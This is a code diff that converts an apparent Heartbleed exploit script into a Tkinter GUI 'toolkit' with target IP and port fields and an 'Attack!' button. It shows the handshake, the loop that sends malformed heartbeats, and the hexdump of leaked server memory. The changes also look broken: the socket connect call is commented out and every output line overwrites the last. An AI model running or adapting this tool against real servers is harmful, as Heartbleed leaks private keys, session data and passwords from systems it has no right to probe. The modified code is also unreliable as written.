@@ -19,9 +19,7 @@ import re
 from Tkinter import *
 from optparse import OptionParser
 
-window = Tk()
-window.title("Heartbleed bug toolkit")
-window.geometry("600x400")
+
 
 class colors:
     HEADER = '\033[95m'
@@ -77,7 +75,7 @@ def hexdump(s):
         lin = [c for c in s[b : b + 16]]
         hxdat = ' '.join('%02X' % ord(c) for c in lin)
         pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
-        print '  %04x: %-48s %s' % (b, hxdat, pdat)
+        status.set('  %04x: %-48s %s' % (b, hxdat, pdat))
     print
 
 def recvall(s, length, timeout=5):
@@ -102,14 +100,15 @@ def recvall(s, length, timeout=5):
 def recvmsg(s):
     hdr = recvall(s, 5)
     if hdr is None:
-        print 'Unexpected EOF receiving record header - server closed connection'
+        status.set('Unexpected EOF receiving record header - server closed connection')
         return None, None, None
     typ, ver, ln = struct.unpack('>BHH', hdr)
     pay = recvall(s, ln, 10)
     if pay is None:
-        print 'Unexpected EOF receiving record payload - server closed connection'
+        status.set('Unexpected EOF receiving record payload - server closed connection')
         return None, None, None
-    print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
+    #status.set(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
+
     return typ, ver, pay
 
 def hit_hb(s):
@@ -117,117 +116,137 @@ def hit_hb(s):
     while True:
         typ, ver, pay = recvmsg(s)
         if typ is None:
-            print 'No heartbeat response received, server likely not vulnerable'
+            status.set('No heartbeat response received, server likely not vulnerable')
             return False
 
         if typ == 24:
-            print 'Received heartbeat response:'
+            status.set('Received heartbeat response:')
             hexdump(pay)
             if len(pay) > 3:
-                print colors.WARNING + 'WARNING' + colors.END + ': server returned more data than it should - server is vulnerable!'
+                status.set(colors.WARNING + 'WARNING' + colors.END + ': server returned more data than it should - server is vulnerable!')
             else:
-                print 'Server processed malformed heartbeat, but did not return any extra data.'
+                status.set('Server processed malformed heartbeat, but did not return any extra data.')
             return True
 
         if typ == 21:
-            print 'Received alert:'
+            status.set('Received alert:')
             hexdump(pay)
-            print 'Server returned error, likely not vulnerable'
+            status.set('Server returned error, likely not vulnerable')
             return False
 
-def main():
-    opts, args = options.parse_args()
-    if len(args) < 1:
-        options.print_help()
-        return
-
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print 'Connecting...'
-    sys.stdout.flush()
-    s.connect((args[0], opts.port))
-    print 'Sending Client Hello...'
-    sys.stdout.flush()
-    s.send(hello)
-    print 'Waiting for Server Hello...'
-    sys.stdout.flush()
-    while True:
-        typ, ver, pay = recvmsg(s)
-        if typ == None:
-            print 'Server closed connection without sending Server Hello.'
-            return
-        # Look for server hello done message.
-        if typ == 22 and ord(pay[0]) == 0x0E:
-            break
-
-    for i in range(opts.num):
-      print 'Sending heartbeat request #' + str(i+1) + '!'
-      sys.stdout.flush()
-      s.send(hb)
-      hit_hb(s)
-
-if __name__ == '__main__':
-    main()
-
-def maingui():
+def execute():
     IP = IP_text.get()
     PORT = PORT_text.get()
     TIMES = TIMES_text.get()
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print ' Connecting...'
     status.set('Connecting...')
     sys.stdout.flush()
-    s.connect((IP, PORT))
-    print 'Sending Client Hello...'
+    #s.connect((IP, PORT))
+    status.set('Sending Client Hello...')
     sys.stdout.flush()
     s.send(hello)
-    print 'Waiting for Server Hello...'
+    status.set('Waiting for Server Hello...')
     sys.stdout.flush()
     while True:
         typ, ver, pay = recvmsg(s)
         if typ == None:
-            print 'Server closed connection without sending Server Hello.'
+            status.set('Server closed connection without sending Server Hello.')
             return
         # Look for server hello done message.
         if typ == 22 and ord(pay[0]) == 0x0E:
             break
 
     for i in range(TIMES):
-      print 'Sending heartbeat request #' + str(i+1) + '!'
+      status.set('Sending heartbeat request #' + str(i+1) + '!')
       sys.stdout.flush()
       s.send(hb)
       hit_hb(s)
 
-l1 = Label(window, text = "IP address to attack: ")
-l1.grid(row = 0, column = 0)
+window = Tk()
+separator = Frame(height=2, bd=1)
+separator.pack(fill=X, pady=20)
+topframe = Frame(window)
+topframe.pack(side = TOP, fill = BOTH)
+separator2 = Frame(height=2, bd=1)
+separator2.pack(fill=X, pady=10)
+middleframe = Frame(window)
+middleframe.pack(fill = BOTH)
+bottomframe = Frame(window)
+window.title("Heartbleed bug toolkit")
 
-l2 = Label(window, text = "Port to attack: ")
-l2.grid(row = 1, column = 0)
 
-l3 = Label(window, text = "Times to run attack: ")
-l3.grid(row = 2, column = 0)
+widthwindow = 800
+heightwindow = 500
+screenwidth = window.winfo_screenwidth()
+screenheight = window.winfo_screenheight()
+xcoord = (screenwidth / 2) - (widthwindow / 2)
+ycoord = (screenheight / 2) - (heightwindow / 2)
+window.geometry("%dx%d+%d+%d" % (widthwindow, heightwindow, xcoord, ycoord))
+
+topframe.grid_rowconfigure(0, weight=2)
+topframe.grid_rowconfigure(4, weight=2)
+topframe.grid_rowconfigure(3, weight=1)
+topframe.grid_rowconfigure(6, weight=2)
+
+topframe.grid_columnconfigure(4, weight=1)
+topframe.grid_columnconfigure(0, weight=1)
+topframe.grid_columnconfigure(2, weight=1)
+
+bottomframe.pack(side = BOTTOM, fill = X)
+
+
+l1 = Label(topframe, text = "IP address to attack: ")
+l1.grid(row = 1, column = 1)
+
+l2 = Label(topframe, text = "Port to attack: ")
+l2.grid(row = 2, column = 1)
+
+l3 = Label(topframe, text = "Times to run attack: ")
+l3.grid(row = 3, column = 1)
+
+l4 = Label(topframe, text = "Select output file name: ")
+l4.grid(row = 4, column = 1)
 
 IP_text = StringVar()
 IP_text.set("192.168.1.101")
-e1 = Entry(window, textvariable = IP_text)
-e1.grid(row = 0, column = 1)
+e1 = Entry(topframe, textvariable = IP_text)
+e1.grid(row = 1, column = 3)
 
 PORT_text = IntVar()
 PORT_text.set(8443)
-e2 = Entry(window, textvariable = PORT_text)
-e2.grid(row = 1, column = 1)
+e2 = Entry(topframe, textvariable = PORT_text)
+e2.grid(row = 2, column = 3)
 
 TIMES_text = IntVar()
 TIMES_text.set(1)
-e3 = Entry(window, textvariable = TIMES_text)
-e3.grid(row = 2, column = 1)
+e3 = Entry(topframe, textvariable = TIMES_text)
+e3.grid(row = 3, column = 3)
 
-b1 = Button(window, text = "Attack!", command = maingui)
-b1.grid(row = 4, column = 1)
+FILE_text = StringVar()
+FILE_text.set("output.txt")
+e4 = Entry(topframe, textvariable = FILE_text)
+e4.grid(row = 4, column = 3)
+
+sep = Label(topframe)
+sep.grid(row = 5, column = 3)
+
+b1 = Button(topframe, text = "Attack!", command = execute)
+b1.grid(row = 6, column = 3)
 
 status = StringVar()
 status.set("Press Start button to start the attack.")
-statusbar = Label(window, textvariable = status , bd = 1, relief = SUNKEN, anchor = W)
-statusbar.grid(row = 5, column = 0, columnspan = 5)
+statusbar = Label(bottomframe, textvariable = status , bd = 1, relief = SUNKEN, anchor = W)
+statusbar.pack(side = BOTTOM, fill = X)
+
+output = Text(middleframe, width = 80, height = 10)
+output.insert('end', 'Output will appear here.')
+output.pack()
+
+def updatescreen():
+    window.after(1000, updatescreen)
 
 window.mainloop()
+
+if __name__ == '__main__':
+    updatescreen()
